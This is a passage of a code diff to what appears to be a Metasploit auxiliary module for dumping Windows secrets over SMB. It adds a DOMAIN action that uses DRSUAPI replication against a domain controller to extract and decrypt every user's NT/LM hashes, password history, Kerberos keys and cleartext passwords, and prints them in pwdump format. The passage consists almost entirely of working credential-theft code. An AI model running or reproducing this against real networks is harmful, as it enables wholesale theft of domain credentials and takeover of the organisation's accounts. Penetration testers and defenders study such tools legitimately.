+      RubySMB::Dcerpc::Samr::RpcSid.new("#{@domain_sid}-#{group}")
+    end
+    groups + alias_groups + builtin_alias_groups
+  ensure
+    @samr.close_handle(user_handle) if user_handle
+  end
+
+  def connect_drs
+    dcerpc_client = RubySMB::Dcerpc::Client.new(
+      rhost,
+      RubySMB::Dcerpc::Drsr,
+      username: datastore['SMBUser'],
+      password: datastore['SMBPass']
+    )
+
+    dcerpc_client.connect
+    vprint_status('Binding to DRSR...')
+    dcerpc_client.bind(
+      endpoint: RubySMB::Dcerpc::Drsr,
+      auth_level: RubySMB::Dcerpc::RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+      auth_type: RubySMB::Dcerpc::RPC_C_AUTHN_WINNT
+    )
+    vprint_status('Bound to DRSR')
+
+    dcerpc_client
+  rescue ::Rex::Proto::DCERPC::Exceptions::Error, ArgumentError => e
+    print_error("Unable to bind to the directory replication remote service (DRS): #{e}")
+    return
+  end
+
+  def decrypt_supplemental_info(dcerpc_client, result, attribute_value)
+    result[:kerberos_keys] = {}
+    result[:clear_text_passwords] = {}
+    plain_text = dcerpc_client.decrypt_attribute_value(attribute_value)
+    user_properties = RubySMB::Dcerpc::Samr::UserProperties.read(plain_text)
+    user_properties.user_properties.each do |user_property|
+      case user_property.property_name.encode('utf-8')
+      when 'Primary:Kerberos-Newer-Keys'
+        value = user_property.property_value
+        binary_value = value.chars.each_slice(2).map { |a, b| (a + b).hex.chr }.join
+        kerb_stored_credential_new = RubySMB::Dcerpc::Samr::KerbStoredCredentialNew.read(binary_value)
+        key_values = kerb_stored_credential_new.get_key_values
+        kerb_stored_credential_new.credentials.each_with_index do |credential, i|
+          kerberos_type = RubySMB::Dcerpc::Samr::KERBEROS_TYPE[credential.key_type]
+          if kerberos_type
+            result[:kerberos_keys][kerberos_type] = key_values[i].unpack('H*')[0]
+          else
+            result[:kerberos_keys]["0x#{credential.key_type.to_i.to_s(16)}"] = key_values[i].unpack('H*')[0]
+          end
+        end
+      when 'Primary:CLEARTEXT'
+        # [MS-SAMR] 3.1.1.8.11.5 Primary:CLEARTEXT Property
+        # This credential type is the cleartext password. The value format is the UTF-16 encoded cleartext password.
+        begin
+          result[:clear_text_passwords] << user_property.property_value.to_s.force_encoding('utf-16le').encode('utf-8')
+        rescue EncodingError
+          # This could be because we're decoding a machine password. Printing it hex
+          # Keep clear_text_passwords with a ASCII-8BIT encoding
+          result[:clear_text_passwords] << user_property.property_value.to_s
+        end
+      end
+    end
+  end
+
+  def parse_user_record(dcerpc_client, user_record)
+    vprint_status("Decrypting hash for user: #{user_record.pmsg_out.msg_getchg.p_nc.string_name.to_ary[0..-1].join.encode('utf-8')}")
+
+    entinf_struct = user_record.pmsg_out.msg_getchg.p_objects.entinf
+    rid = entinf_struct.p_name.sid[-4..-1].unpack('<L').first
+    dn = user_record.pmsg_out.msg_getchg.p_nc.string_name.to_ary[0..-1].join.encode('utf-8')
+
+    result = {
+      dn: dn,
+      rid: rid,
+      object_sid: rid,
+      lm_hash: Net::NTLM.lm_hash(''),
+      nt_hash: Net::NTLM.ntlm_hash(''),
+      disabled: nil,
+      pwd_last_set: nil,
+      last_logon: nil,
+      expires: nil,
+      computer_account: nil,
+      password_never_expires: nil,
+      password_not_required: nil,
+      lm_history: [],
+      nt_history: [],
+      domain_name: '',
+      username: 'unknown',
+      admin: false,
+      domain_admin: false,
+      enterprise_admin: false
+    }
+
+    entinf_struct.attr_block.p_attr.each do |attr|
+      next unless attr.attr_val.val_count > 0
+
+      att_id = user_record.pmsg_out.msg_getchg.oid_from_attid(attr.attr_typ)
+      lookup_table = RubySMB::Dcerpc::Drsr::ATTRTYP_TO_ATTID
+
+      attribute_value = attr.attr_val.p_aval[0].p_val.to_ary.map(&:chr).join
+      case att_id
+      when lookup_table['dBCSPwd']
+        encrypted_lm_hash = dcerpc_client.decrypt_attribute_value(attribute_value)
+        result[:lm_hash] = dcerpc_client.remove_des_layer(encrypted_lm_hash, rid)
+      when lookup_table['unicodePwd']
+        encrypted_nt_hash = dcerpc_client.decrypt_attribute_value(attribute_value)
+        result[:nt_hash] = dcerpc_client.remove_des_layer(encrypted_nt_hash, rid)
+      when lookup_table['userPrincipalName']
+        result[:domain_name] = attribute_value.force_encoding('utf-16le').split('@'.encode('utf-16le')).last
+      when lookup_table['sAMAccountName']
+        result[:username] = attribute_value.force_encoding('utf-16le').encode('utf-8')
+      when lookup_table['objectSid']
+        result[:object_sid] = attribute_value
+      when lookup_table['userAccountControl']
+        user_account_control = attribute_value.unpack('L<')[0]
+        result[:disabled] = user_account_control & RubySMB::Dcerpc::Samr::UF_ACCOUNTDISABLE != 0
+        result[:computer_account] = user_account_control & RubySMB::Dcerpc::Samr::UF_NORMAL_ACCOUNT == 0
+        result[:password_never_expires] = user_account_control & RubySMB::Dcerpc::Samr::UF_DONT_EXPIRE_PASSWD != 0
+        result[:password_not_required] = user_account_control & RubySMB::Dcerpc::Samr::UF_PASSWD_NOTREQD != 0
+      when lookup_table['pwdLastSet']
+        result[:pwd_last_set] = Time.at(0)
+        time_value = attribute_value.unpack('Q<')[0]
+        if time_value > 0
+          result[:pwd_last_set] = RubySMB::Field::FileTime.new(time_value).to_time.utc
+        end
+      when lookup_table['lastLogonTimestamp']
+        result[:last_logon] = Time.at(0)
+        time_value = attribute_value.unpack('Q<')[0]
+        if time_value > 0
+          result[:last_logon] = RubySMB::Field::FileTime.new(time_value).to_time.utc
+        end
+      when lookup_table['accountExpires']
+        result[:expires] = Time.at(0)
+        time_value = attribute_value.unpack('Q<')[0]
+        if time_value > 0 && time_value != 0x7FFFFFFFFFFFFFFF
+          result[:expires] = RubySMB::Field::FileTime.new(time_value).to_time.utc
+        end
+      when lookup_table['lmPwdHistory']
+        tmp_lm_history = dcerpc_client.decrypt_attribute_value(attribute_value)
+        tmp_lm_history.bytes.each_slice(16) do |block|
+          result[:lm_history] << dcerpc_client.remove_des_layer(block.map(&:chr).join, rid)
+        end
+      when lookup_table['ntPwdHistory']
+        tmp_nt_history = dcerpc_client.decrypt_attribute_value(attribute_value)
+        tmp_nt_history.bytes.each_slice(16) do |block|
+          result[:nt_history] << dcerpc_client.remove_des_layer(block.map(&:chr).join, rid)
+        end
+      when lookup_table['supplementalCredentials']
+        decrypt_supplemental_info(dcerpc_client, result, attribute_value)
+      end
+    end
+
+    result
+  end
+
+  def dump_ntds_hashes
+    _machine_name, domain_name = get_machine_name_and_domain
+    return unless domain_name
+
+    print_status('Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)')
+    print_status('Using the DRSUAPI method to get NTDS.DIT secrets')
+
+    begin
+      connect_samr(domain_name)
+    rescue RubySMB::Error::RubySMBError => e
+      print_error(
+        "Unable to connect to the remote Security Account Manager (SAM) ([#{e.class}] #{e}). "\
+        'Is the remote server a Domain Controller?'
+      )
+      return
+    end
+    users = get_domain_users
+
+    dcerpc_client = connect_drs
+    ph_drs = dcerpc_client.drs_bind
+    dc_infos = dcerpc_client.drs_domain_controller_info(ph_drs, domain_name)
+    user_info = {}
+    dc_infos.each do |dc_info|
+      users.each do |sid, _name|
+        crack_names = dcerpc_client.drs_crack_names(ph_drs, rp_names: [sid])
+        crack_names.each do |crack_name|
+          user_record = dcerpc_client.drs_get_nc_changes(
+            ph_drs,
+            nc_guid: crack_name.p_name.to_s.encode('utf-8'),
+            dsa_object_guid: dc_info.ntds_dsa_object_guid
+          )
+          user_info[sid] = parse_user_record(dcerpc_client, user_record)
+        end
+
+        groups = get_user_groups(sid)
+        groups.each do |group|
+          case group.name
+          when 'BUILTIN\\Administrators'
+            user_info[sid][:admin] = true
+          when '(domain)\\Domain Admins'
+            user_info[sid][:domain_admin] = true
+          when '(domain)\\Enterprise Admins'
+            user_info[sid][:enterprise_admin] = true
+          end
+        end
+      end
+    end
+
+    credential_opts = {
+      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
+      realm_value: domain_name
+    }
+
+    print_line('# SID\'s:')
+    user_info.each do |sid, info|
+      full_name = "#{domain_name}\\#{info[:username]}"
+      print_line("#{full_name}: #{sid}")
+    end
+
+    print_line("\n# NTLM hashes:")
+    user_info.each do |_sid, info|
+      hash = "#{info[:lm_hash].unpack('H*')[0]}:#{info[:nt_hash].unpack('H*')[0]}"
+      full_name = "#{domain_name}\\#{info[:username]}"
+      unless report_creds(full_name, hash, **credential_opts)
+        vprint_bad("Error when reporting #{full_name} hash")
+      end
+      print_line("#{full_name}:#{info[:rid]}:#{hash}:::")
+    end
+
+    print_line("\n# Full pwdump format:")
+    user_info.each do |sid, info|
+      hash = "#{info[:lm_hash].unpack('H*')[0]}:#{info[:nt_hash].unpack('H*')[0]}"
+      full_name = "#{domain_name}\\#{info[:username]}"
+      pwdump = "#{full_name}:#{info[:rid]}:#{hash}:"
+      extra_info = "Disabled=#{info[:disabled].nil? ? 'N/A' : info[:disabled]},"
+      extra_info << "Expired=#{!info[:disabled] && info[:expires] && info[:expires] > Time.at(0) && info[:expires] < Time.now},"
+      extra_info << "PasswordNeverExpires=#{info[:password_never_expires].nil? ? 'N/A' : info[:password_never_expires]},"
+      extra_info << "PasswordNotRequired=#{info[:password_not_required].nil? ? 'N/A' : info[:password_not_required]},"
+      extra_info << "PasswordLastChanged=#{info[:pwd_last_set] && info[:pwd_last_set] > Time.at(0) ? info[:pwd_last_set].strftime('%Y%m%d%H%M') : 'never'},"
+      extra_info << "LastLogonTimestamp=#{info[:last_logon] && info[:last_logon] > Time.at(0) ? info[:last_logon].strftime('%Y%m%d%H%M') : 'never'},"
+      extra_info << "IsAdministrator=#{info[:admin]},"
+      extra_info << "IsDomainAdmin=#{info[:domain_admin]},"
+      extra_info << "IsEnterpriseAdmin=#{info[:enterprise_admin]}"
+      print_line(pwdump + extra_info + '::')
+      report_info("#{full_name} (#{sid}): #{extra_info}", 'user.info')
+    end
+
+    print_line("\n# Account Info:")
+    user_info.each do |_sid, info|
+      print_line("## #{info[:dn]}")
+      print_line("- Administrator: #{info[:admin]}")
+      print_line("- Domain Admin: #{info[:domain_admin]}")
+      print_line("- Enterprise Admin: #{info[:enterprise_admin]}")
+      print_line("- Password last changed: #{info[:pwd_last_set] && info[:pwd_last_set] > Time.at(0) ? info[:pwd_last_set] : 'never'}")
+      print_line("- Last logon: #{info[:last_logon] && info[:last_logon] > Time.at(0) ? info[:last_logon] : 'never'}")
+      print_line("- Account disabled: #{info[:disabled].nil? ? 'N/A' : info[:disabled]}")
+      print_line("- Computer account: #{info[:computer_account].nil? ? 'N/A' : info[:computer_account]}")
+
+      print_line("- Expired: #{!info[:disabled] && info[:expires] && info[:expires] > Time.at(0) && info[:expires] < Time.now}")
+      print_line("- Password never expires: #{info[:password_never_expires].nil? ? 'N/A' : info[:password_never_expires]}")
+      print_line("- Password not required: #{info[:password_not_required].nil? ? 'N/A' : info[:password_not_required]}")
+    end
+
+    print_line("\n# Password history (pwdump format - uid:rid:lmhash:nthash:::):")
+    user_info.each do |_sid, info|
+      full_name = "#{domain_name}\\#{info[:username]}"
+
+      if info[:nt_history].size > 1 || info[:lm_history].size > 1
+        info[:nt_history][1..-1].zip(info[:lm_history][1..-1]).reverse.each_with_index do |history, i|
+          nt_h, lm_h = history
+          if @lm_hash_not_stored.nil? && lm_h
+            print_warning(
+              'NoLMHash policy was not retrieved correctly and we don\'t know if '\
+              'LMHashes are being stored or not. We are assuming it is stored and '\
+              'the lmhash value will be displayed in the following hash. If it is '\
+              "not stored, just replace it with the empty lmhash (#{Net::NTLM.lm_hash('').unpack('H*')[0]})"
+            )
+          end
+          lm_h = Net::NTLM.lm_hash('') if lm_h.nil? || @lm_hash_not_stored
+          history_hash = "#{lm_h.unpack('H*')[0]}:#{nt_h.unpack('H*')[0]}"
+          history_name = "#{full_name}_history#{i}"
+          unless report_creds(history_name, history_hash, **credential_opts)
+            vprint_bad("Error when reporting #{full_name} history hash ##{i}")
+          end
+          print_line("#{history_name}:#{info[:rid]}:#{history_hash}:::")
+        end
+      else
+        vprint_line("No password history for #{full_name}")
+      end
+    end
+
+    print_line("\n# Kerberos keys:")
+    user_info.each do |_sid, info|
+      full_name = "#{domain_name}\\#{info[:username]}"
+
+      if info[:kerberos_keys].nil? || info[:kerberos_keys].empty?
+        vprint_line("No Kerberos keys for #{full_name}")
+      else
+        credential_opts[:type] = :nonreplayable_hash
+        info[:kerberos_keys].each do |key_type, key_value|
+          key = "#{key_type}:#{key_value}"
+          unless report_creds(full_name, key, **credential_opts)
+            vprint_bad("Error when reporting #{full_name} kerberos key #{key}")
+          end
+          print_line "#{full_name}:#{key}"
+        end
+      end
+    end
+
+    print_line("\n# Clear text passwords:")
+    user_info.each do |_sid, info|
+      full_name = "#{domain_name}\\#{info[:username]}"
+
+      if info[:clear_text_passwords].nil? || info[:clear_text_passwords].empty?
+        vprint_line("No clear text passwords for #{full_name}")
+      else
+        credential_opts[:type] = :password
+        info[:clear_text_passwords].each do |passwd|
+          unless report_creds(full_name, passwd, **credential_opts)
+            vprint_bad("Error when reporting #{full_name} clear text password")
+          end
+          print_line("#{full_name}:CLEARTEXT:#{passwd}")
+        end
+      end
+    end
+  ensure
+    @samr.close_handle(@domain_handle) if @domain_handle
+    @samr.close_handle(@builtin_domain_handle) if @builtin_domain_handle
+    @samr.close_handle(@server_handle) if @server_handle
+    @samr.close
+    if dcerpc_client
+      dcerpc_client.drs_unbind(ph_drs)
+      dcerpc_client.close
     end
   end
 
@@ -1002,14 +953,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    connect
-    unless simple.client.is_a?(RubySMB::Client)
-      fail_with(Module::Failure::BadConfig,
-                'RubySMB client must be used for this (current client is'\
-                "#{simple.client.class.name}). Make sure 'SMB::ProtocolVersion' advanced"\
-                'option contains at least one SMB version greater then SMBv1 (e.g. '\
-                "'set SMB::ProtocolVersion 1,2,3').")
+    unless db
+      print_warning('Cannot find any active database. Extracted data will only be displayed here and NOT stored.')
     end
+
+    connect
     begin
       smb_login
     rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
@@ -1054,56 +1002,85 @@ class MetasploitModule < Msf::Auxiliary
       @winreg = @tree.open_file(filename: 'winreg', write: true, read: true)
       @winreg.bind(endpoint: RubySMB::Dcerpc::Winreg)
     rescue RubySMB::Error::RubySMBError => e
-      fail_with(Module::Failure::Unreachable,
-                "Error when connecting to 'winreg' interface ([#{e.class}] #{e}).")
+      if action.name == 'DOMAIN'
+        print_warning(
+          "Error when connecting to 'winreg' interface ([#{e.class}] #{e})... continuing "\
+          'since action is DOMAIN'
+        )
+      else
+        fail_with(Module::Failure::Unreachable,
+                  "Error when connecting to 'winreg' interface ([#{e.class}] #{e})."\
+                  'If it is a Domain Controller, you can still try DOMAIN action since '\
+                  'it does not need RemoteRegistry')
+      end
     end
 
+    boot_key = ''
     begin
-      boot_key = get_boot_key
+      boot_key = get_boot_key if @winreg
     rescue RubySMB::Error::RubySMBError => e
-      print_error("Error when getting bootKey: #{e}")
-      boot_key = ''
+      print_error("Error when getting BootKey: #{e}")
     end
-    fail_with(Module::Failure::Unknown, 'Unable to get bootKey') if boot_key&.empty?
+    if boot_key.empty?
+      if action.name == 'DOMAIN'
+        print_warning('Unable to get BootKey... continuing since action is DOMAIN')
+      else
+        fail_with(Module::Failure::Unknown,
+                  'Unable to get BootKey. If it is a Domain Controller, you can still '\
+                  'try DOMAIN action since it does not need BootKey')
+      end
+    end
     report_info(boot_key.unpack('H*')[0], 'host.boot_key')
 
-    lm_hash_not_stored?
+    check_lm_hash_not_stored if @winreg
 
-    begin
-      sam = save_sam
-    rescue RubySMB::Error::RubySMBError => e
-      print_error("Error when getting SAM hive ([#{e.class}] #{e}).")
-      sam = nil
+    if ['ALL', 'SAM'].include?(action.name)
+      begin
+        sam = save_sam
+      rescue RubySMB::Error::RubySMBError => e
+        print_error("Error when getting SAM hive ([#{e.class}] #{e}).")
+        sam = nil
+      end
+
+      if sam
+        reg_parser = Msf::Util::WindowsRegistry.parse(sam, name: :sam)
+        dump_sam_hashes(reg_parser, boot_key)
+      end
     end
 
-    if sam
-      reg_parser = Msf::Util::WindowsRegistryParser.new(sam)
-      dump_sam_hashes(reg_parser, boot_key)
-    end
+    if ['ALL', 'CACHE', 'LSA'].include?(action.name)
+      begin
+        security = save_security
+      rescue RubySMB::Error::RubySMBError => e
+        print_error("Error when getting SECURITY hive ([#{e.class}] #{e}).")
+        security = nil
+      end
 
-    begin
-      security = save_security
-    rescue RubySMB::Error::RubySMBError => e
-      print_error("Error when getting SECURITY hive ([#{e.class}] #{e}).")
-      security = nil
-    end
-
-    if security
-      reg_parser = Msf::Util::WindowsRegistryParser.new(security)
-      lsa_key = get_lsa_secret_key(reg_parser, boot_key)
-      if lsa_key.nil? || lsa_key.empty?
-        print_status('No LSA key, skip LSA secrets and cached hashes dump')
-      else
-        report_info(lsa_key.unpack('H*')[0], 'host.lsa_key')
-        dump_lsa_secrets(reg_parser, lsa_key)
-        nlkm_key = get_nlkm_secret_key(reg_parser, lsa_key)
-        if nlkm_key.nil? || nlkm_key.empty?
-          print_status('No NLKM key (skip cached hashes dump)')
+      if security
+        reg_parser = Msf::Util::WindowsRegistry.parse(security, name: :security)
+        lsa_key = get_lsa_secret_key(reg_parser, boot_key)
+        if lsa_key.nil? || lsa_key.empty?
+          print_status('No LSA key, skip LSA secrets and cached hashes dump')
         else
-          report_info(nlkm_key.unpack('H*')[0], 'host.nlkm_key')
-          dump_cached_hashes(reg_parser, nlkm_key)
+          report_info(lsa_key.unpack('H*')[0], 'host.lsa_key')
+          if ['ALL', 'LSA'].include?(action.name)
+            dump_lsa_secrets(reg_parser, lsa_key)
+          end
+          if ['ALL', 'CACHE'].include?(action.name)
+            nlkm_key = get_nlkm_secret_key(reg_parser, lsa_key)
+            if nlkm_key.nil? || nlkm_key.empty?
+              print_status('No NLKM key (skip cached hashes dump)')
+            else
+              report_info(nlkm_key.unpack('H*')[0], 'host.nlkm_key')
+              dump_cached_hashes(reg_parser, nlkm_key)
+            end
+          end
         end
       end
+    end
+
+    if ['ALL', 'DOMAIN'].include?(action.name)
+      dump_ntds_hashes
     end
 
     do_cleanup
